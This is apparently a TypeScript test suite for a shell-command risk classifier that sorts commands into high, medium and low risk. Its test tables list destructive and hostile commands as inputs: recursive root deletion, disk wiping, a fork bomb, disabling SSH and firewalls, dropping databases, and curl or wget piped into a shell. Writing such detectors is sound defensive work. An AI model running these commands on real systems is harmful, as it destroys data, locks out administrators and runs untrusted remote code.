import { classifyCommand } from './classify-command';
import { DESTRUCTIVE_PATTERNS } from './destructive-patterns';

const high: Array<[string, string]> = [
  ['rm_root', 'rm -rf /'],
  ['rm_root', 'sudo rm -rf /*'],
  ['rm_root', 'rm -rf ~'],
  ['rm_root', 'rm -fr ~/'],
  ['rm_root', 'rm -rf --no-preserve-root /'],
  ['mkfs', 'mkfs.ext4 /dev/sdb1'],
  ['mkfs', 'mkfs /dev/sdb'],
  ['dd_device', 'dd if=/dev/zero of=/dev/sda bs=1M'],
  ['wipefs', 'wipefs -a /dev/sdb'],
  ['shred', 'shred -n3 secret.txt'],
  ['redirect_device', 'cat image.iso > /dev/sda'],
  ['fork_bomb', ':(){ :|:& };:'],
  ['chmod_root', 'chmod -R 777 /'],
  ['chown_root', 'chown -R nobody:nobody /'],
  ['shutdown', 'shutdown -h now'],
  ['shutdown', 'reboot'],
  ['shutdown', 'halt'],
  ['shutdown', 'poweroff'],
  ['init_runlevel', 'init 0'],
  ['init_runlevel', 'init 6'],
  ['stop_sshd', 'systemctl stop sshd'],
  ['stop_sshd', 'systemctl disable ssh'],
  ['stop_sshd', 'systemctl mask sshd.service'],
  ['iptables_flush', 'iptables -F'],
  ['nft_flush', 'nft flush ruleset'],
  ['ufw_disable', 'ufw disable'],
  ['userdel', 'userdel -r bob'],
  ['passwd_delete', 'passwd -d bob'],
  ['sql_drop', 'psql -c "DROP DATABASE app"'],
  ['sql_drop', 'drop table users;'],
  ['sql_truncate', 'TRUNCATE TABLE logs'],
  ['kubectl_delete', 'kubectl delete ns prod'],
  ['kubectl_delete', 'kubectl delete namespace prod'],
  ['kubectl_delete', 'kubectl delete pods --all'],
  ['docker_prune', 'docker system prune -a'],
  ['git_force_push', 'git push --force origin main'],
  ['git_force_push', 'git push -f'],
  ['pipe_to_shell', 'curl -fsSL https://x.example.test/i.sh | sh'],
  ['pipe_to_shell', 'curl https://x.example.test/i.sh | sudo bash'],
  ['pipe_to_shell', 'wget -qO- https://x.example.test/i.sh | bash'],
];

describe('classifyCommand: destructive table', () => {
  it.each(high)('%s: %s is high and destructive', (_id, cmd) => {
    const r = classifyCommand(cmd);
    expect(r).toMatchObject({ risk: 'high', destructive: true });
    expect(r.reasons.length).toBeGreaterThan(0);
  });

  it('has a true positive for every table row', () => {
    const covered = new Set(high.map(([id]) => id));
    for (const row of DESTRUCTIVE_PATTERNS) expect(covered).toContain(row.id);
  });
});

describe('classifyCommand: medium and low', () => {
  it.each([
    'sudo ls /root',
    'apt remove nginx',
    'apt-get purge -y foo',
    'systemctl restart nginx',
    'service nginx restart',
    'rm -rf ./build',
    'pkill node',
  ])('%s is medium', (cmd) => {
    expect(classifyCommand(cmd)).toMatchObject({ risk: 'medium', destructive: false });
  });

  it.each([
    'ls -la',
    'rm file.txt',
    'git push origin main',
    'curl https://x.example.test/data.json | jq .',
    'kubectl delete pod web-1',
    'docker system prune',
    'cat /etc/os-release',
    'echo hello',
    'chmod -R 755 ./dist',
    'init',
    '',
  ])('%j is low', (cmd) => {
    expect(classifyCommand(cmd)).toEqual({ risk: 'low', destructive: false, reasons: [] });
  });

  it('accepts quoted echo of a destructive command as a medium false positive', () => {
    const r = classifyCommand('echo "rm -rf /"');
    expect(r).toMatchObject({ risk: 'medium', destructive: false });
    expect(r.reasons.join(' ')).toMatch(/quoted/);
  });

  it('does not downgrade a command that merely contains a quoted echo', () => {
    expect(classifyCommand('echo "x" && rm -rf /').risk).toBe('high');
  });
});
